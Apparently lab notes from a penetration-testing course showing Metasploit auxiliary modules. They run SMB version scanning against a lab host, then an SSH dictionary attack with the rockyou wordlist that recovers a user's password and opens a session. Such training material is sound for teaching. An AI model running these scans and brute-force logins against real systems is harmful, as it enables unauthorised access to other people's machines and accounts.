# Auxiliary Modules

Listing all auxiliary modules
>``` shell
>msf6 > show auxiliary
>
># ========== Expected Result ==========
>Auxiliary
>=========
>
>   Name                                 Rank    Description
>   ----                                 ----    -----------
>   ...
>   985   auxiliary/scanner/smb/impacket/dcomexec                                  2018-03-19       normal  No     DCOM Exec
>   986   auxiliary/scanner/smb/impacket/secretsdump                                                normal  No     DCOM Exec
>   987   auxiliary/scanner/smb/impacket/wmiexec                                   2018-03-19       normal  No     WMI Exec
>   988   auxiliary/scanner/smb/pipe_auditor                                                        normal  No     SMB Session Pipe Auditor
>   989   auxiliary/scanner/smb/pipe_dcerpc_auditor                                                 normal  No     SMB Session Pipe DCERPC Auditor
>   990   auxiliary/scanner/smb/psexec_loggedin_users                                               normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
>   991   auxiliary/scanner/smb/smb_enum_gpp                                                        normal  No     SMB Group Policy Preference Saved Passwords Enumeration
>   992   auxiliary/scanner/smb/smb_enumshares                                                      normal  No     SMB Share Enumeration
>   993   auxiliary/scanner/smb/smb_enumusers                                                       normal  No     SMB User Enumeration (SAM EnumUsers)
>   994   auxiliary/scanner/smb/smb_enumusers_domain                                                normal  No     SMB Domain User Enumeration
>   995   auxiliary/scanner/smb/smb_login                                                           normal  No     SMB Login Check Scanner
>   996   auxiliary/scanner/smb/smb_lookupsid                                                       normal  No     SMB SID User Enumeration (LookupSid)
>   997   auxiliary/scanner/smb/smb_ms17_010                                                        normal  No     MS17-010 SMB RCE Detection
>   998   auxiliary/scanner/smb/smb_uninit_cred                                                     normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
>   999   auxiliary/scanner/smb/smb_version                                                         normal  No     SMB Version Detection
>   ...
># =====================================
>```

Searching for all SMB auxiliary modules in Metasploit
>``` shell
>msf6 > search type:auxiliary smb
>
># ========== Expected Result ==========
>Matching Modules
>================
>
>   #  Name                                              Disclosure Date  Rank    Check  Description
>   -  ----                                              ---------------  ----    -----  -----------
>   ...
>   52  auxiliary/scanner/smb/smb_enumshares                                             normal  No     SMB Share Enumeration
>   53  auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                   normal  No     SMB Tree Connect Request Corruption
>   54  auxiliary/fuzzers/smb/smb_tree_connect                                           normal  No     SMB Tree Connect Request Fuzzer
>   55  auxiliary/scanner/smb/smb_enumusers                                              normal  No     SMB User Enumeration (SAM EnumUsers)
>   56  auxiliary/scanner/smb/smb_version                                               normal  No     SMB Version Detection
>   ...
>
>Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access
># =====================================
>```

Activate smb_version module
>``` shell
>msf6 > use 56
>
># ========== Expected Result ==========
>msf6 auxiliary(scanner/smb/smb_version) >
># =====================================
>```

Displaying information about the smb_version module
>``` shell
>msf6 auxiliary(scanner/smb/smb_version) > info
>
># ========== Expected Result ==========
>       Name: SMB Version Detection
>     Module: auxiliary/scanner/smb/smb_version
>    License: Metasploit Framework License (BSD)
>       Rank: Normal
>
>Provided by:
>  hdm <x@hdm.io>
>  Spencer McIntyre
>  Christophe De La Fuente
>
>Check supported:
>  No
>
>Basic options:
>  Name     Current Setting  Required  Description
>  ----     ---------------  --------  -----------
>  RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
>  THREADS  1                yes       The number of concurrent threads (max one per host)
>
>Description:
>  Fingerprint and display version information about SMB servers. 
>  Protocol information and host operating system (if available) will 
>  be reported. Host operating system detection requires the remote 
>  server to support version 1 of the SMB protocol. Compression and 
>  encryption capability negotiation is only present in version 3.1.1.
># =====================================
>```

Displaying options of the smb_version module
>``` shell
>msf6 auxiliary(scanner/smb/smb_version) > show options
>
># ========== Expected Result ==========
>Module options (auxiliary/scanner/smb/smb_version):
>
>   Name     Current Setting  Required  Description
>   ----     ---------------  --------  -----------
>   RHOSTS                    yes       The target host(s)...
>   THREADS  1                yes       The number of concurrent threads (max one per host)
># =====================================
>```

Setting the value of the option RHOSTS manually
>``` shell
>msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202
>
># ========== Expected Result ==========
>RHOSTS => 192.168.50.202
># =====================================
>```

Setting RHOSTS in an automated fashion via the database results
>``` shell
>msf6 auxiliary(scanner/smb/smb_version) > unset RHOSTS
>
># ========== Expected Result ==========
>Unsetting RHOSTS...
># =====================================
>
>msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
>
># ========== Expected Result ==========
>Services
>========
>
>host            port  proto  name          state  info
>----            ----  -----  ----          -----  ----
>192.168.50.202  445   tcp    microsoft-ds  open
>
>RHOSTS => 192.168.50.202
># =====================================
>```

Executing the auxiliary module to detect the SMB version of a target
>``` shell
>msf6 auxiliary(scanner/smb/smb_version) > run
>
># ========== Expected Result ==========
>[*] 192.168.50.202:445    - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1, Pattern_V1) (encryption capabilities:AES-256-GCM) (signatures:optional) (guid:{e09176d2-9a06-427d-9b70-f08719643f4d}) (authentication domain:BRUTE2)
>[*] 192.168.50.202:       - Scanned 1 of 1 hosts (100% complete)
>[*] Auxiliary module execution completed
># =====================================
>```

Displaying vulnerabilities identified by Metasploit
>``` shell
>msf6 auxiliary(scanner/smb/smb_version) > vulns
>
># ========== Expected Result ==========
>Vulnerabilities
>===============
>
>Timestamp                Host            Name                         References
>---------                ----            ----                         ----------
>2022-07-28 10:17:41 UTC  192.168.50.202  SMB Signing Is Not Required  URL-https://support.microsoft.com/en-us/help/161372/how-to-enable-smb-signing-in-windows-nt,URL-https://support.microsoft.com/en-us/help/88
>                                                                      7429/overview-of-server-message-block-signing
># =====================================
>```

Displaying all SSH auxiliary modules
>``` shell
>msf6 auxiliary(scanner/smb/smb_version) > search type:auxiliary ssh
>
># ========== Expected Result ==========
>Matching Modules
>================
>
>   #   Name                                                  Disclosure Date  Rank    Check  Description
>   -   ----                                                  ---------------  ----    -----  -----------
>   ...
>   15  auxiliary/scanner/ssh/ssh_login                                        normal  No     SSH Login Check Scanner
>   16  auxiliary/scanner/ssh/ssh_identify_pubkeys                             normal  No     SSH Public Key Acceptance Scanner
>   17  auxiliary/scanner/ssh/ssh_login_pubkey                                 normal  No     SSH Public Key Login Scanner
>   18  auxiliary/scanner/ssh/ssh_enumusers                                    normal  No     SSH Username Enumeration
>   19  auxiliary/fuzzers/ssh/ssh_version_corrupt                              normal  No     SSH Version Corruption
>   20  auxiliary/scanner/ssh/ssh_version                                      normal  No     SSH Version Scanner
>   ...
># =====================================
>```

Display options of the ssh_login module
>``` shell
>msf6 auxiliary(scanner/smb/smb_version) > use 15
>
>msf6 auxiliary(scanner/ssh/ssh_login) > show options
>
># ========== Expected Result ==========
>Module options (auxiliary/scanner/ssh/ssh_login):
>
>   Name              Current Setting  Required  Description
>   ----              ---------------  --------  -----------
>...
>   PASSWORD                           no        A specific password to authenticate with
>   PASS_FILE                          no        File containing passwords, one per line
>   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
>   RPORT             22               yes       The target port
>   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
>   THREADS           1                yes       The number of concurrent threads (max one per host)
>   USERNAME                           no        A specific username to authenticate as
>   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
>   USER_AS_PASS      false            no        Try the username as the password for all users
>   USER_FILE                          no        File containing usernames, one per line
>   VERBOSE           false            yes       Whether to print output for all attempts
># =====================================
>```

Set options of ssh_login
>``` shell
>msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
>
># ========== Expected Result ==========
>PASS_FILE => /usr/share/wordlists/rockyou.txt
># =====================================
>
>msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
>
># ========== Expected Result ==========
>USERNAME => george
># =====================================
>
>msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.50.201
>
># ========== Expected Result ==========
>RHOSTS => 192.168.50.201
># =====================================
>
>msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
>
># ========== Expected Result ==========
>RPORT => 2222
># =====================================
>```

Successful dictionary attack with Metasploit
>``` shell
>msf6 auxiliary(scanner/ssh/ssh_login) > run
>
># ========== Expected Result ==========
>[*] 192.168.50.201:2222 - Starting bruteforce
>[+] 192.168.50.201:2222 - Success: 'george:chocolate' 'uid=1001(george) gid=1001(george) groups=1001(george) Linux brute 5.15.0-37-generic #39-Ubuntu SMP Wed Jun 1 19:16:45 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
>[*] SSH session 1 opened (192.168.119.2:38329 -> 192.168.50.201:2222) at 2022-07-28 07:22:05 -0400
>[*] Scanned 1 of 1 hosts (100% complete)
>[*] Auxiliary module execution completed
># =====================================
>```

Displaying all saved credentials of the database
>``` shell
>msf6 auxiliary(scanner/ssh/ssh_login) > creds
>
># ========== Expected Result ==========
>Credentials
>===========
>
>host            origin          service       public  private    realm  private_type  JtR Format
>----            ------          -------       ------  -------    -----  ------------  ----------
>192.168.50.201  192.168.50.201  2222/tcp (ssh)  george  chocolate         Password  
># =====================================
>```

Lab 1 - Once VM Group 1 is started, follow the steps outlined in this section. Log in to VM #1 (BRUTE) via SSH and find the flag in the george user's home directory.
>``` shell
>
>```
>
